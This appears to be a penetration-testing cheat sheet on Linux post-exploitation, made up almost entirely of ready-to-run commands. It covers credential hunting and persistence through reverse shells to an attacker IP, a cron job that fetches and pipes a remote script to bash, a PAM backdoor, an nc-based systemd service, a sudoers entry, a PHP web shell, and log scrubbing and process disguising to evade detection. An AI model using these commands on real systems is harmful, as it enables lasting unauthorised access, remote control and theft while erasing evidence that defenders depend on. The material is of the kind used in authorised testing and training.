---
title: 7. Post-exploitation - Linux
date: 2024-08-02 15:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Linux
  - Post-exploitation
  - Persistence
toc: true
---

---
Step 7 in a penetration test: Post-exploitation.
Install backdoors for persistence, extract credentials and relevant data, clean step foots. 

---
<!-- more -->

<br>


## Credentials
```bash Eviltree
# regex
python3 eviltree.py -r $dir -x ".{0,3}passwd.{0.3}[=]{1}.{0,18}" -A -q -i -v
# keywords
python3 eviltree.py -r $dir -k passw,db_,admin,account,user,token -A -q -i -v
```

<br>

## Persistence
SSH backdoor
```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
```

Add yourself to authorized users
```bash
# on local machine: generate public key
ssh-keygen 
# on local machine: copy the public key to victim
scp ~/.ssh/id_rsa.pub remote-user@$IP:~/.ssh/
# on victim machine: add the public key to authorized_keys 
cat ~/.ssh/id_rsa.pub >> authorized_keys
# on local machine: set the file permissions
chmod 600 ~/.ssh/authorized_keys
# on local machine: SSH in
ssh -i ~/.ssh/id_rsa remote-user@$IP # -o PubkeyAcceptedKeyTypes=rsa-sha2-256 
```

Create a cronjob
```bash shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.109/443 0>&1
```
```bash create cronjob
echo "* *     * * *   root    curl http://10.10.10.109:80/shell.sh | bash &" >> /etc/crontab
```

Revshell via `.bashrc`
```bash
echo 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1' >> ~/.bashrc
```

PAM (Pluggable Authentication Modules) Backdoor
```bash
git clone https://github.com/zephrax/linux-pam-backdoor
# generate backdoored pam_unix.so
./backdoor.sh -v 1.3.0 -p som3_s3cr4t_p455w0rd

# !! identify the PAM version installed on the system !!

# copy the generated backdoor to the afferent directory
cp pam_unix.so /usr/lib/security/
```

Custom service
```bash
nano ~/.config/systemd/user/backdoor.service
```
```conf ~/.config/systemd/user/backdoor.service
[Unit]
Description=Very important backdoor.[Service]
Type=simple
ExecStart=/usr/bin/nc -e /bin/bash 10.10.10.10 443 2>/dev/null
[Install]
WantedBy=default.target
```
```bash
systemctl --user enable backdoor
```

Add user to sudoers
```bash
echo 'username        ALL=(ALL)        NOPASSWD: ALL' >> /etc/sudoers
```

PHP backdoor in webapp
```php
<?php
    if (isset($_REQUEST['explicit_cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['explicit_cmd']) . "</pre>";
    }
?>
```

Background reverse shell
```bash Reverse shell every 2 minutes
# $att_ip is the attacker's IP
while :; do setsid bash -i &>/dev/tcp/$att_ip/8443 0>&1; sleep 120; done &>/dev/null &
```

<br>

## Avoid detection
Hide your SSH connection
> nothing is added to `/var/log/utmp`
> user won't appear in `w` or `who` output
```bash
ssh -o UserKnownHostsFile=/dev/null -T user@$IP 'bash -i'
```

Change file timestamp
```bash
touch -t YYYYMMDDhhmm filename
```

Don't remove log files - it is suspicious. Replace the domains and IPs
```bash
cd /dev/shm; grep -v "$domain" /var/log/auth.log > a.log; cat a.log > /var/log/auth.log; rm -f a.log
```

Hide a command by masking it in the `syslogd`
```bash scan the victim's network
exec -a syslogd nmap -T0 10.0.2.1/24
```

Start a background hidden process in the `syslogd`
```bash
exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &
```

<br>

---
---
